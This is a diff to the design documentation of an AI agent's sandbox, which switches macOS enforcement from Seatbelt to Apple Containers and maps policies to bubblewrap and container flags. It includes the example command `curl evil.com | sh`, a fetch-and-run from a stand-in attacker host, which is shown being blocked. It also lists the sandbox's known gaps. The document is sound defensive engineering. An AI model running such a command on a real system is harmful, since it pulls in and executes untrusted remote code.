@@ -9,7 +9,7 @@ to alternative implementations, or audit everything the agent does.
 - `src/sandbox/mod.rs` — `Sandbox` trait, `SandboxDecision`, `create_sandbox()`
 - `src/sandbox/policy.rs` — `SandboxPolicy`, `Access`, `PathAccess`, `PolicyTable` (intent abstraction)
 - `src/sandbox/policy_sandbox.rs` — `PolicySandbox` (application + OS-level enforcement)
-- `src/sandbox/os.rs` — `OsSandbox` (macOS Seatbelt / Linux bubblewrap), policy-based command builders
+- `src/sandbox/os.rs` — `OsSandbox` (macOS Apple Containers / Linux bubblewrap), policy-based command builders
 - `src/sandbox/composite.rs` — `CompositeSandbox` (chain multiple sandboxes)
 - `src/sandbox/no_sandbox.rs` — `DangerousNoSandbox` (CLI-only bypass)
 
@@ -44,12 +44,12 @@ The sandbox system separates **intent** from **enforcement**:
 ```
 Intent (SandboxPolicy)         Enforcement (platform-specific)
   network: Deny          ->    Linux: --unshare-net (bwrap)
-                               macOS: (deny network*) (Seatbelt)
+                               macOS: --network none (Apple Container)
   file_write: RestrictTo ->    Linux: --ro-bind / / + --bind <path>
-       ["/workspace"]         macOS: (deny file-write* (require-not ...))
+       ["/workspace"]         macOS: -v path:path (writable bind mount)
                                App:   check path in tool input JSON
   file_read: RestrictTo  ->    Linux: selective --ro-bind per path + system dirs
-       ["/workspace"]         macOS: (deny file-read* (require-not ...))
+       ["/workspace"]         macOS: -v path:path:ro (read-only bind mount)
                                App:   canonicalize() + starts_with() check
 ```
 
@@ -64,10 +64,10 @@ Each tool starts with NO permissions, then gets granted specific capabilities:
 
 | Capability | Description | OS Enforcement | Strength |
 |-----------|-------------|----------------|----------|
-| `network` | Outbound network connections | `--unshare-net` / `(deny network*)` | Kernel-enforced, strong |
-| `file_read` | Read from filesystem | Selective `--ro-bind` / `(deny file-read*)` | Strong for user data; system dirs always readable |
-| `file_write` | Write to filesystem | `--bind` mounts / `(deny file-write*)` | Strong; /tmp is isolated via `--tmpfs` |
-| `process_exec` | PID namespace isolation | `--unshare-pid` | Weak; hides PIDs only, does not block exec |
+| `network` | Outbound network connections | `--unshare-net` (bwrap) / `--network none` (container) | Kernel-enforced, strong |
+| `file_read` | Read from filesystem | Selective `--ro-bind` (bwrap) / `-v path:path:ro` (container) | Strong for user data; system dirs always readable |
+| `file_write` | Write to filesystem | `--bind` mounts (bwrap) / `-v path:path` (container) | Strong; /tmp is isolated via `--tmpfs` |
+| `process_exec` | PID namespace isolation | `--unshare-pid` (bwrap only) | Weak; hides PIDs only, does not block exec |
 
 File capabilities support path restrictions:
 
@@ -146,20 +146,23 @@ and remaining components are re-appended.
 
 For bash commands, the policy is translated into kernel-enforced restrictions:
 
-| | macOS | Linux |
+| | macOS (Apple Containers) | Linux (bubblewrap) |
 |---|---|---|
-| Tool | `sandbox-exec` (Seatbelt) | `bwrap` (bubblewrap) |
-| Install | Built-in | `apt install bubblewrap` |
-| Network deny | `(deny network*)` | `--unshare-net` |
-| Restricted reads | `(deny file-read* (require-not ...))` | Selective `--ro-bind` per path + system dirs |
-| Writable paths | `(deny file-write* (require-not ...))` | `--bind <path> <path>` |
-| /tmp isolation | N/A (subpath exception) | `--tmpfs /tmp` (isolated, not host /tmp) |
-| PID isolation | N/A | `--unshare-pid` (visibility only) |
-| Kill on exit | N/A | `--die-with-parent` |
+| Tool | `container` ([apple/container](https://github.com/apple/container)) | `bwrap` (bubblewrap) |
+| Install | `brew install container` | `apt install bubblewrap` |
+| Mechanism | Lightweight Linux VM via Apple Virtualization framework | Linux namespaces for filesystem and PID isolation |
+| Network deny | `--network none` | `--unshare-net` |
+| Restricted reads | `-v path:path:ro` (read-only bind mount) | Selective `--ro-bind` per path + system dirs |
+| Writable paths | `-v path:path` (writable bind mount) | `--bind <path> <path>` |
+| /tmp isolation | `--tmpfs /tmp` | `--tmpfs /tmp` (isolated, not host /tmp) |
+| PID isolation | VM boundary (inherent) | `--unshare-pid` (visibility only) |
+| Kill on exit | `--rm` (container removed) | `--die-with-parent` |
 
-Example: `curl evil.com | sh` → policy translates to `bwrap --unshare-net ... bash -c 'curl evil.com | sh'` → kernel blocks network → curl fails.
+Example (Linux): `curl evil.com | sh` → policy translates to `bwrap --unshare-net ... bash -c 'curl evil.com | sh'` → kernel blocks network → curl fails.
 
-**System dirs always mounted:** `/usr`, `/bin`, `/sbin`, `/lib`, `/lib64`, `/etc` are read-only mounted even when `file_read` is restricted (bash needs them). Protection is against reading *user data*, not system files.
+Example (macOS): same command → `container run --rm --network none -v ... alpine:latest sh -c 'curl evil.com | sh'` → VM has no network → curl fails.
+
+**System dirs (Linux):** `/usr`, `/bin`, `/sbin`, `/lib`, `/lib64`, `/etc` are read-only mounted even when `file_read` is restricted (bash needs them). Protection is against reading *user data*, not system files.
 
 **Isolated /tmp:** `--tmpfs /tmp` gives each command its own empty `/tmp`, preventing cross-command temp file communication.
 
@@ -245,7 +248,7 @@ effect. Only the network capability changes.
 
 | Field | Values | Description |
 |-------|--------|-------------|
-| `network` | `"allow"`, `"deny"` | Kernel-enforced via network namespace / Seatbelt rule |
+| `network` | `"allow"`, `"deny"` | Kernel-enforced via network namespace (bwrap) / `--network none` (container) |
 | `file_read` | `"allow"`, `"deny"`, `{"restrict_to": [...]}` | Filesystem read access (symlinks resolved) |
 | `file_write` | `"allow"`, `"deny"`, `{"restrict_to": [...]}` | Filesystem write access |
 | `process_exec` | `"allow"`, `"deny"` | PID namespace isolation only (does not block exec) |
@@ -330,7 +333,7 @@ Subsumes the old `OsSandbox` behavior.
 
 The original bash-only sandbox. Still available for direct use, but
 `PolicySandbox` handles bash sandboxing now via the same underlying
-`build_bwrap_command_from_policy()` / `build_seatbelt_command_from_policy()`
+`build_bwrap_command_from_policy()` / `build_container_command_from_policy()`
 functions. The profile-based API (`"default"`, `"strict"`, `"permissive"`)
 is preserved for backward compatibility.
 
@@ -349,11 +352,10 @@ flag. Cannot be set from config.
 ## Known Limitations
 
 - **`process_exec: Deny` is weak** — `--unshare-pid` hides host PIDs but doesn't block `fork`/`execve`. True prevention needs seccomp-bpf.
-- **System dirs always readable** — `/etc`, `/usr`, `/bin` are mounted for bash to function. Protects user data, not system files.
+- **System dirs always readable (Linux)** — `/etc`, `/usr`, `/bin` are mounted for bash to function. Protects user data, not system files.
 - **MCP servers not sandboxed** — they run as external processes with full host access. The sandbox only gates whether the agent can *invoke* them.
-- **macOS Seatbelt deprecated** — still works on macOS 15+, no replacement for CLI sandboxing. Used by Homebrew, Nix, etc.
+- **Apple Containers require Apple Silicon** — the `container` CLI uses the Apple Virtualization framework, which is only available on ARM Macs.
 - **No syscall filtering** — without seccomp-bpf, arbitrary syscalls are possible. Run Dyson in a container for defense in depth.
-- **Seatbelt path sanitization** — paths with `"` or `\` are rejected to prevent S-expression injection.
 
 ---
 
